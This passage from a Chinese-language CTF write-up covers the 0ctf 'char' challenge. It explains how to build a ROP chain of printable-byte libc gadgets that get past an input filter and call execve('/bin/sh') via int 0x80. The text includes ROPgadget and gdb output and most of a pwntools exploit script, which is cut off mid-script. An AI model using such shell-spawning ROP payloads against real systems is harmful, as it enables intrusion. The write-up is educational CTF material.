style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >不过看到</font>strlen函数，#将\x00视为字符串结尾</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >马上我就想到了这次华东北赛区的</font>EMachine这题。我们用/x00截断了程序check机制对我们ROP链的修改。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >不过坑爹的是我们造成栈溢出的</font>strcpy函数也是依据\x00来作为截断符的。所以我们如果截断了check机制，同样我们也会截断我们的ROP链。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >因为几个函数的调用，都没过审。。。简单来说基本上就是把调用函数的这条路封死了。貌似只有一小部分的</font>gadget能过审。#感谢映射了libc到程序中，我们有更多的gadget可以用。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >举个栗子</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >首先在</font>libc中找到gadget，取得偏移量</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >$&nbsp;ROPgadget&nbsp;--binary&nbsp;libc.so&nbsp;--only&nbsp;"pop|ret"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >0x0001706b&nbsp;:&nbsp;pop&nbsp;eax&nbsp;;&nbsp;pop&nbsp;ebx&nbsp;;&nbsp;pop&nbsp;esi&nbsp;;&nbsp;pop&nbsp;edi&nbsp;;&nbsp;pop&nbsp;ebp&nbsp;;&nbsp;ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >在</font>exp.pyh中将偏移地址与映射的基址相加</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >#部分代码#</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >base=0x5555E000</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >pop_eax=0x0001706b</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >p.recvuntil('GO&nbsp;:&nbsp;)&nbsp;\n')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload="A"*32</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(pop_eax+base)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >运行发现成功过审。</font>#组合出来，每一位都在31~126之间#</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="415"  height="134"  src="WriteupTo0ctf-char.files/WriteupTo0ctf-char1520.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >这样出题人的思路就很明确了，还是构造</font>ROP，只是让我们用int&nbsp;0x80直接呼叫中断，来调用函数。#出题人也不容易啊，为了让我们学到这个知识点，估计掉了不少头发。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >官方的</font>writeup是通过调用大量的过审的gadget，最后int&nbsp;0x80中断呼出execve函数来弹出shell</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >但是从网上看大神的写的各种</font>writeup，发现有些大神有更巧妙的办法将这个机制绕过，使用一些本来过不了审的gadget。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >0x01&nbsp;ROP</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >首先，来使用</font>int0x80的方法。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >构造</font>ROP链&nbsp;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >-&#62;思路：中断调用execve</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >eax=0xb&nbsp;ebx=/bin/sh的地址&nbsp;ecx=0&nbsp;edx=0</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >因为</font>libc已经被映射在了固定的位置，所以/bin/sh的地址是固定的。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >gdb-peda$&nbsp;find&nbsp;/bin/sh</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >libc.so&nbsp;:&nbsp;0x556bb7ec&nbsp;(das)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >但是</font>0xec这一部分是不过审的</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >所以先写入一个领近的数据，然后再通过加减寄存器来修改值。</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >因为考试周比较忙，所以这一个脚本就写了我两三天，主要寻找能用的</font>gadget实在太艰难了。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >实际上原理也不难，就是比较麻烦。</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" >exp脚本如下</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >from&nbsp;pwn&nbsp;import&nbsp;*</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >#context.log_level='Debug'</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >p=process('./char')</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >gdb.attach(p,'b&nbsp;*0x08048692')</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >libc=ELF('libc.so')</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >elf=ELF('char')</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >base=0x5555E000</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >pop_eax=0x0001706b&nbsp;#0x0001706b&nbsp;:&nbsp;pop&nbsp;eax&nbsp;;&nbsp;pop&nbsp;ebx&nbsp;;&nbsp;pop&nbsp;esi&nbsp;;&nbsp;pop&nbsp;edi&nbsp;;&nbsp;pop&nbsp;ebp&nbsp;;&nbsp;ret</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >xchg_esp_eax=0x00019548</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >mov_eax_ecx=0x000f7b03</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >sub_ecx_edx=0xf7b4c&nbsp;</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >xor_eax_eax=0x00095555</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >xor_eax_eax_2=xor_eax_eax+0x1&nbsp;#delete&nbsp;pop&nbsp;edx</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >pop_ecx=0x00174a4f+0x2</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >sub_ecx_eax=0x000f7aff</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >pop_ebx=0x000e5028</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >inc_eax=0x00168864</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >add_ah_al=0x00174860</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >add_bh_ah=0x000d6e43</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >add_bl_al=0x0009843f</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >xor_edx_edx=0x000e8367&nbsp;#0x00082d35&nbsp;#xor&nbsp;edx,&nbsp;edx&nbsp;;&nbsp;pop&nbsp;ebx&nbsp;;&nbsp;mov&nbsp;eax,&nbsp;edx&nbsp;;&nbsp;pop&nbsp;esi&nbsp;;&nbsp;pop&nbsp;edi&nbsp;;&nbsp;pop&nbsp;ebp&nbsp;;&nbsp;ret</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >int_80=0x00109177</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >p.recvuntil('GO&nbsp;:&nbsp;)&nbsp;\n')</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload="A"*32</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >#ecx=0&nbsp;edx=0</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(xor_eax_eax+base)&nbsp;#pop&nbsp;edx;&nbsp;xor&nbsp;eax,&nbsp;eax&nbsp;;&nbsp;pop&nbsp;edi&nbsp;;&nbsp;ret&nbsp;&nbsp;&nbsp;--&#62;eax=0</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(0x41414141)</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(0x41414141)</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(pop_ecx+base)&nbsp;#&nbsp;pop&nbsp;ecx&nbsp;;&nbsp;add&nbsp;al,&nbsp;0xa&nbsp;;&nbsp;ret&nbsp;--&#62;&nbsp;ecx=0x41414141&nbsp;eax=0xa</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(0x41414141)</span><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;mso-fareast-font-family:微软雅黑;color:rgb(68,114,196);font-size:9.0000pt;mso-font-kerning:1.0000pt;" >payload+=p32(sub_ecx_edx+base)&nbsp;#sub&nbsp;ecx,&nbsp;edx&nbsp;;&nbsp;add&nbsp;esp,&nbsp;0x4c&nbsp;;&nbsp;mov&nbsp;eax,&nbsp;ecx&nbsp;;&nbsp;pop&nbsp;ebx&nbsp;;&nbsp;pop&nbsp;esi&nbsp;;&nbsp;pop&nbsp;edi&nbsp;;&nbsp;pop&nbsp;ebp&nbsp;;&nbsp;ret&nbsp;--&#62;&nbsp;ecx=0</span><span 